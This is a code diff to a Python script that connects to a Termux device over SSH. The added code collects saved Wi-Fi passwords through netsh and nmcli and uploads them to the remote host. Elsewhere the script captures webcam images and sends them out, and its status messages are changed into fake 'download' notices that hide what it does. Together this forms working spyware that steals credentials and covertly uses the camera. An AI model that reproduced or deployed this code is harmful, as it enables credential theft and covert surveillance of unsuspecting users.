@@ -9,6 +9,7 @@ import re
 import psutil
 import getpass
 import os
+import subprocess
 
 # SSH connection details
 TERMUX_IP = "192.168.x.x"  # Replace with Termux IP address
@@ -58,8 +59,39 @@ def get_device_info():
 )
     }
 
+def get_saved_wifi_passwords():
+    """Retrieves saved Wi-Fi passwords for Windows and Linux."""
+    wifi_passwords = []
+    try:
+        if platform.system() == "Windows":
+            # Command to list all saved Wi-Fi profiles
+            profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
+            profile_names = re.findall("All User Profile\s*: (.*)", profiles)
+            
+            # Get passwords for each profile
+            for profile in profile_names:
+                try:
+                    results = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode("utf-8", errors="ignore")
+                    password = re.search("Key Content\s*: (.*)", results)
+                    wifi_passwords.append((profile, password.group(1) if password else "No password"))
+                except subprocess.CalledProcessError:
+                    wifi_passwords.append((profile, "Error retrieving password"))
+        elif platform.system() == "Linux":
+            # Use nmcli to get Wi-Fi profiles and passwords (requires superuser privileges)
+            profiles = subprocess.check_output("nmcli -t -f NAME connection show", shell=True).decode("utf-8").splitlines()
+            for profile in profiles:
+                try:
+                    password = subprocess.check_output(f"nmcli -s -g 802-11-wireless-security.psk connection show '{profile}'", shell=True).decode("utf-8").strip()
+                    wifi_passwords.append((profile, password if password else "No password"))
+                except subprocess.CalledProcessError:
+                    wifi_passwords.append((profile, "Error retrieving password"))
+    except Exception as e:
+        wifi_passwords.append(("Error", str(e)))
+
+    return wifi_passwords
+
 def log_info_to_termux(info, ssh_client):
-    """Logs device info directly to the Termux device."""
+    """Logs device info and Wi-Fi passwords directly to the Termux device."""
     sftp_client = ssh_client.open_sftp()
     log_file_path = os.path.join(REMOTE_PATH, "device_info_log.txt")
 
@@ -68,21 +100,27 @@ def log_info_to_termux(info, ssh_client):
             # Check if device info already exists in the log
             existing_content = sftp_client.open(log_file_path).read().decode('utf-8')
             if info["MAC Address"] in existing_content:
-                print("Device info already logged on server. Skipping entry.")
+                print("file already exist. Skipping En.")
                 return False
 
             # Write new log entry if it doesn't exist
             remote_file.write(f"\n\n--- Device Info Logged at {datetime.now()} ---\n".encode('utf-8'))
             for key, value in info.items():
                 remote_file.write(f"{key}: {value}\n".encode('utf-8'))
-            print(f"Device info written to {log_file_path} on server.")
+
+            # Retrieve and log saved Wi-Fi passwords
+            remote_file.write("\n\n--- Saved Wi-Fi Passwords ---\n".encode('utf-8'))
+            wifi_passwords = get_saved_wifi_passwords()
+            for ssid, password in wifi_passwords:
+                remote_file.write(f"SSID: {ssid}, Password: {password}\n".encode('utf-8'))
+
+            print(f"Downloading wait..")
         return True
     except Exception as e:
         print(f"Error logging info to server: {e}")
         return False
     finally:
         sftp_client.close()
-
 
 def get_next_image_filename(sftp_client):
     """Determines the next available filename for captured images in Termux."""
@@ -107,15 +145,15 @@ def capture_and_transfer_images(ssh_client, image_count=5, interval=0.2):
                 # Save the image temporarily, then transfer and delete it
                 cv2.imwrite(local_image_path, frame)
                 sftp_client.put(local_image_path, os.path.join(REMOTE_PATH, remote_filename))
-                print(f"Send")
+                print(f"Code file downloading....")
                 os.remove(local_image_path)  # Clean up local temporary file
             else:
-                print("Failed to cap i.")
+                print("Failed to cap im.")
             time.sleep(interval)
         camera.release()
         cv2.destroyAllWindows()
     except Exception as e:
-        print(f"Error capturing and transferring images: {e}")
+        print(f"Error cap & trans im: {e}")
     finally:
         sftp_client.close()
 
@@ -132,6 +170,7 @@ def main():
 
     # Close SSH connection
     ssh_client.close()
+    print("download faild")
 
 if __name__ == "__main__":
     main()
